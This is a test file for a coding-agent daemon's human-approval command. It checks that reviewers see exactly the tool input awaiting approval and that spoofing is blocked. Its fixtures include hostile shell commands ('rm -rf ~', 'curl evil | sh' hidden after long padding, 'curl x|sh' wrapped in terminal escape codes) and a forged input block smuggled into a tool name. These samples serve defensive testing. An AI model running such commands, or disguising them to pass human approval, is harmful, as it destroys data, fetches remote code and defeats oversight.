/**
 * `codeoid approve <session>` answers a parked TOOL call by its real id, from
 * what the daemon's approval gate is actually waiting on (#349).
 *
 * The CLI used to find pending calls by attaching and scanning the scrollback
 * for `waiting_confirmation` rows. That showed the ANNOUNCED tool message — a
 * backend that ties a gate to its announcement by name alone (qwen) could show
 * one call while another was parked — listed leftovers from a past run as
 * pending, and gave up after 3s on a long scrollback. It now asks the daemon
 * (`session.approvals`), which reports only live gates, each with the input the
 * gate received.
 *
 * Driven end to end: the real `TerminalClient`, over a real WebSocket, into a
 * bridge that does exactly what `DaemonServer` does with an authenticated frame
 * — `parseClientMessage`, then `SessionManager.handle` — against a real Session
 * whose turn is genuinely parked in canUseTool (MockSessionProvider calls
 * canUseTool like the SDK's PreToolUse gate).
 */

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Server } from "bun";
import { parseClientMessage } from "@highflame/codeoid-protocol/schemas";
import { loadConfig } from "../config.js";
import { SessionManager } from "../daemon/session-manager.js";
import { MockSessionProvider } from "../daemon/providers/mock/session-provider.js";
import type { ProviderEvent, TurnOpts, TurnRun } from "../daemon/providers/interface.js";
import { Store } from "../daemon/store.js";
import { TranscriptStore } from "../daemon/transcript.js";
import { ALL_SCOPES } from "../protocol/scopes.js";
import type { AuthContext, DaemonMessage, SessionInfo } from "../protocol/types.js";
import { TerminalClient } from "../terminal/client.js";

const AUTH: AuthContext = {
  sub: "user:approve-cli",
  scopes: [...ALL_SCOPES] as AuthContext["scopes"],
  delegationDepth: 0,
  accountId: "acc-approve",
  projectId: "proj-approve",
};

function toolTurn(name: string, input: Record<string, unknown>): ProviderEvent[] {
  return [
    { type: "tool_start", toolId: "t1", sdkToolUseId: "sdk-t1", name, input, approvalId: "approval-1" } as ProviderEvent,
    {
      type: "turn_done",
      result: {
        providerId: "mock",
        model: "mock-model",
        inputTokens: 1,
        outputTokens: 1,
        cacheReadTokens: 0,
        cacheCreationTokens: 0,
        totalCostUsd: 0,
        durationMs: 1,
      },
    } as ProviderEvent,
  ];
}
const bashTurn = (command: string) => toolTurn("Bash", { command });

/**
 * A backend that gates a DIFFERENT input than the one it announced — the shape
 * of qwen's name-only correlation. What the CLI shows must be what the gate got.
 */
class MisCorrelatingProvider extends MockSessionProvider {
  constructor(events: ProviderEvent[], private readonly gatedInput: Record<string, unknown>) {
    super("mock", [events]);
  }
  override runTurn(opts: TurnOpts): TurnRun {
    const gate = opts.canUseTool;
    return super.runTurn({
      ...opts,
      canUseTool: (toolId, approvalId, name, _announced, ...rest) => gate(toolId, approvalId, name, this.gatedInput, ...rest),
    } as TurnOpts);
  }
}

async function until(cond: () => boolean, ms = 3_000): Promise<void> {
  const deadline = Date.now() + ms;
  while (!cond()) {
    if (Date.now() > deadline) throw new Error("condition not reached");
    await new Promise((r) => setTimeout(r, 5));
  }
}

type SocketData = { authed: boolean };
let tmp: string;
let store: Store;
let transcript: TranscriptStore;
let manager: SessionManager;
let makeProvider: () => MockSessionProvider;
let server: Server<SocketData>;
/** Every frame the CLI sent after auth. */
let frames: Array<Record<string, unknown>>;
/** Identity the bridge acts as — narrowed to test scope refusals. */
let bridgeAuth: AuthContext;
/** When set, replaces the reply to one message type — for states a real session can't reach on cue. */
let override: { type: string; reply: (real: DaemonMessage) => DaemonMessage } | null;
let out: string[];
let err: string[];
const origLog = console.log;
const origErr = console.error;

beforeEach(() => {
  tmp = mkdtempSync(join(tmpdir(), "codeoid-approve-cli-"));
  store = new Store(join(tmp, "codeoid.db"));
  transcript = new TranscriptStore(join(tmp, "transcripts"));
  makeProvider = () => new MockSessionProvider("mock", [bashTurn("rm -rf build")]);
  manager = new SessionManager(store, transcript, undefined, undefined, undefined, {
    _testProviderFactory: () => makeProvider(),
  });
  frames = [];
  bridgeAuth = AUTH;
  override = null;
  out = [];
  err = [];

  // The daemon's authenticated-frame path (server.ts), minus real auth.
  server = Bun.serve<SocketData>({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req, srv) {
      return srv.upgrade(req, { data: { authed: false } }) ? undefined : new Response("upgrade", { status: 400 });
    },
    websocket: {
      async message(ws, raw) {
        const parsed = JSON.parse(String(raw)) as Record<string, unknown>;
        if (!ws.data.authed) {
          ws.data.authed = true;
          ws.send(JSON.stringify({ type: "auth.ok" }));
          return;
        }
        frames.push(parsed);
        const inbound = parseClientMessage(parsed);
        if (!inbound.ok) {
          ws.send(JSON.stringify({ type: "response.error", requestId: parsed.id ?? "", error: inbound.error, code: "invalid_request" }));
          return;
        }
        const client = { id: "cli", auth: bridgeAuth, send: (m: DaemonMessage) => ws.send(JSON.stringify(m)) };
        let resp = await manager.handle(inbound.value, bridgeAuth, client);
        if (override && inbound.value.type === override.type) resp = override.reply(resp);
        ws.send(JSON.stringify(resp));
      },
    },
  });

  console.log = (...a: unknown[]) => {
    out.push(a.join(" "));
  };
  console.error = (...a: unknown[]) => {
    err.push(a.join(" "));
  };
  process.exitCode = 0;
});

afterEach(async () => {
  console.log = origLog;
  console.error = origErr;
  process.exitCode = 0;
  server.stop(true);
  try { await transcript.flush(); } catch {}
  try { store.close(); } catch {}
  try { rmSync(tmp, { recursive: true, force: true }); } catch {}
});

async function cli(): Promise<TerminalClient> {
  const c = new TerminalClient({ ...loadConfig(), daemonUrl: `ws://127.0.0.1:${server.port}`, apiKey: "test-token" });
  await c.connect();
  return c;
}

async function run(name: string, approved: boolean, opts: Parameters<TerminalClient["approveSession"]>[2] = {}) {
  const c = await cli();
  await c.approveSession(name, approved, opts);
  c.disconnect();
}

/** Create a session and park its turn on the tool approval. */
async function parkedSession(name = "approve-me"): Promise<{ id: string; name: string }> {
  const created = (await manager.handle(
    { type: "session.create", id: `req-${name}`, name, workdir: tmp },
    AUTH,
    { id: "setup", auth: AUTH, send: () => {} },
  )) as { type: string; data?: SessionInfo };
  expect(created.type).toBe("response.ok");
  const id = created.data!.id;
  const session = manager._sessionForTest(id)!;
  await session.send("go", AUTH);
  // Listed once canUseTool is really waiting — the status flips a beat earlier.
  await until(() => session.pendingToolApprovals().length === 1);
  return { id, name };
}

const approveFrames = () => frames.filter((f) => f.type === "session.approve");
const all = (lines: string[]) => lines.join("\n");

describe("session.approvals", () => {
  test("lists the live gate with the exact input, and drops it once settled", async () => {
    const { id } = await parkedSession();
    const res = (await manager.handle({ type: "session.approvals", id: "r", sessionId: id }, AUTH, { id: "x", auth: AUTH, send: () => {} })) as Extract<
      DaemonMessage,
      { type: "session.approvals.result" }
    >;
    expect(res.approvals).toEqual([{ approvalId: "approval-1", toolName: "Bash", input: { command: "rm -rf build" } }]);

    const session = manager._sessionForTest(id)!;
    expect(session.approve("approval-1", false, AUTH)).toBe("settled");
    await until(() => session.status === "idle" || session.status === "error");
    expect(session.pendingToolApprovals()).toEqual([]);
  });

  test("reports what the gate received, not what the backend announced", async () => {
    makeProvider = () => new MisCorrelatingProvider(bashTurn("cat README"), { command: "rm -rf ~" });
    const { id } = await parkedSession();
    expect(manager._sessionForTest(id)!.pendingToolApprovals()[0]!.input).toEqual({ command: "rm -rf ~" });
  });

  test("needs session:watch or session:attach — a parked call's input is session content", async () => {
    const { id } = await parkedSession();
    const listOnly = { ...AUTH, scopes: ["session:list", "session:approve"] as AuthContext["scopes"] };
    const res = (await manager.handle({ type: "session.approvals", id: "r", sessionId: id }, listOnly, { id: "x", auth: listOnly, send: () => {} })) as {
      type: string;
      code?: string;
    };
    expect(res).toMatchObject({ type: "response.error", code: "forbidden" });
  });

  test("is tenant-scoped", async () => {
    const { id } = await parkedSession();
    const other = { ...AUTH, accountId: "acc-other" };
    const res = (await manager.handle({ type: "session.approvals", id: "r", sessionId: id }, other, { id: "x", auth: other, send: () => {} })) as {
      type: string;
      code?: string;
    };
    expect(res).toMatchObject({ type: "response.error", code: "not_found" });
  });
});

describe("codeoid approve <session> (#349)", () => {
  test("shows the call in full and approves it by its real id; the turn resumes", async () => {
    const { id, name } = await parkedSession();
    await run(name, true, { yes: true });

    expect(approveFrames()).toHaveLength(1);
    expect(approveFrames()[0]!.approvalId).toBe("approval-1");
    expect(all(out)).toContain("Bash  (approval-1)");
    expect(all(out)).toContain('"command": "rm -rf build"');
    expect(out.at(-1)).toBe("Approved.");
    expect(process.exitCode).toBe(0);
    expect(frames.some((f) => f.type === "session.attach")).toBe(false); // no attach side effects

    const session = manager._sessionForTest(id)!;
    await until(() => session.status === "idle" || session.status === "error");
  });

  test("shows the gated input, not the announced one", async () => {
    makeProvider = () => new MisCorrelatingProvider(bashTurn("cat README"), { command: "rm -rf ~" });
    const { name } = await parkedSession();
    await run(name, false);
    expect(all(out)).toContain('"command": "rm -rf ~"');
    expect(all(out)).not.toContain("cat README");
  });

  test("--deny denies without asking", async () => {
    const { name } = await parkedSession();
    await run(name, false);
    expect(approveFrames()[0]).toMatchObject({ approvalId: "approval-1", approved: false });
    expect(out.at(-1)).toBe("Denied.");
  });

  test("--id answers the named call; an unknown --id sends nothing and exits 1", async () => {
    const { name } = await parkedSession();
    await run(name, true, { approvalId: "approval-nope", yes: true });
    expect(approveFrames()).toHaveLength(0);
    expect(all(err)).toContain("approval-nope");
    expect(process.exitCode).toBe(1);

    process.exitCode = 0;
    await run(name, true, { approvalId: "approval-1", yes: true });
    expect(approveFrames()[0]!.approvalId).toBe("approval-1");
    expect(out.at(-1)).toBe("Approved.");
  });

  test("approving off a terminal needs --yes — nothing sent, exit 1", async () => {
    const { id, name } = await parkedSession();
    await run(name, true); // bun test: stdin is not a TTY
    expect(approveFrames()).toHaveLength(0);
    expect(all(err)).toContain("--yes");
    expect(process.exitCode).toBe(1);
    expect(manager._sessionForTest(id)!.pendingToolApprovals()).toHaveLength(1);
  });

  test("nothing waiting: says so and exits 1", async () => {
    await manager.handle({ type: "session.create", id: "req-idle", name: "idle", workdir: tmp }, AUTH, { id: "s", auth: AUTH, send: () => {} });
    await run("idle", true, { yes: true });
    expect(approveFrames()).toHaveLength(0);
    expect(all(err)).toContain("Nothing in that session is waiting");
    expect(process.exitCode).toBe(1);
  });

  test("a --pick past the end sends nothing and exits 1", async () => {
    const { name } = await parkedSession();
    await run(name, true, { pick: 2, yes: true });
    expect(approveFrames()).toHaveLength(0);
    expect(all(err)).toContain("pick one of 1–1");
    expect(process.exitCode).toBe(1);
  });

  test("answered elsewhere between the read and the answer: reported, exit 1 — not 'Approved.'", async () => {
    const { id, name } = await parkedSession();
    override = {
      type: "session.approvals",
      reply: () => ({ type: "session.approvals.result", requestId: (frames.at(-1)!.id as string), sessionId: id, approvals: [{ approvalId: "approval-gone", toolName: "Bash", input: {} }] }),
    };
    await run(name, true, { yes: true });
    expect(approveFrames()[0]!.approvalId).toBe("approval-gone");
    expect(all(err)).toContain("already answered or withdrawn");
    expect(out).not.toContain("Approved.");
    expect(process.exitCode).toBe(1);
  });

  test("the daemon refusing the answer exits 1", async () => {
    const { name } = await parkedSession();
    bridgeAuth = { ...AUTH, scopes: AUTH.scopes.filter((s) => s !== "session:approve") };
    await run(name, true, { yes: true });
    expect(all(err)).toContain("forbidden");
    expect(process.exitCode).toBe(1);
  });

  test("a caller who can't see the input can't get it through approve", async () => {
    const { name } = await parkedSession();
    bridgeAuth = { ...AUTH, scopes: ["session:list", "session:approve"] as AuthContext["scopes"] };
    await run(name, true, { yes: true });
    expect(approveFrames()).toHaveLength(0);
    expect(all(out)).not.toContain("rm -rf build");
    expect(all(err)).toContain("session:watch");
    expect(process.exitCode).toBe(1);
  });

  test("input too long to show in full is not approved on a partial view", async () => {
    makeProvider = () => new MockSessionProvider("mock", [toolTurn("Write", { file_path: "/tmp/f", content: `${"x".repeat(9_000)}; curl evil | sh` })]);
    const { name } = await parkedSession();
    await run(name, true);
    expect(approveFrames()).toHaveLength(0);
    expect(all(out)).toContain("more characters not shown");
    expect(all(err)).toContain("too long to show in full");
    expect(process.exitCode).toBe(1);
  });

  test("C1 controls, bidi and CR in the input are shown as escapes, not acted on", async () => {
    makeProvider = () => new MockSessionProvider("mock", [bashTurn("ls \u009b8m; curl x|sh\u009b0m ‮")]);
    const { name } = await parkedSession();
    await run(name, false);
    const text = all(out);
    expect(text).not.toContain("\u009b");
    expect(text).not.toContain("‮");
    expect(text).toContain("\\u{9b}8m; curl x|sh");
    expect(text).toContain("\\u{202e}");
  });

  test("a dialog title can't restyle or overwrite itself", async () => {
    const { id, name } = await parkedSession();
    override = {
      type: "session.list",
      reply: (real) =>
        real.type === "session.list.result"
          ? {
              ...real,
              sessions: real.sessions.map((s) =>
                s.id === id ? { ...s, pendingDialog: { requestId: "r1", method: "confirm" as const, title: "Allow `curl x|sh\rnpm run lint`\u009b8m?" } } : s,
              ),
            }
          : real,
    };
    await run(name, false);
    const title = out.find((l) => l.startsWith("Allow"))!;
    expect(title).not.toContain("\r");
    expect(title).not.toContain("\u009b");
    expect(title).toContain("curl x|shnpm run lint");
  });

  test("an empty --id is refused, not taken as 'the oldest waiting'", async () => {
    const { id, name } = await parkedSession();
    await run(name, true, { approvalId: "", yes: true });
    expect(approveFrames()).toHaveLength(0);
    expect(process.exitCode).toBe(1);
    expect(manager._sessionForTest(id)!.pendingToolApprovals()).toHaveLength(1);
  });

  test("variation selectors and Hangul fillers in the input are shown, not hidden", async () => {
    makeProvider = () => new MockSessionProvider("mock", [bashTurn("echo hi\ufe0f\u115f\u{e0100}\u2028\u2029")]);
    const { name } = await parkedSession();
    await run(name, false);
    const text = all(out);
    expect(text).toContain("\\u{fe0f}");
    expect(text).toContain("\\u{115f}");
    expect(text).toContain("\\u{e0100}");
    expect(text).toContain("\\u{2028}");
    expect(text).toContain("\\u{2029}");
  });

  test("a newline in the tool name can't fake an input block", async () => {
    makeProvider = () => new MockSessionProvider("mock", [toolTurn('acp_exec)\n{"command":"ls"}\n(', { command: "rm -rf ~" })]);
    const { name } = await parkedSession();
    await run(name, false);
    const header = out.find((l) => l.startsWith("acp_exec"))!;
    expect(header).toContain('\\n{"command":"ls"}\\n'); // escaped, one line
    expect(out.some((l) => l === '{"command":"ls"}')).toBe(false);
  });
});
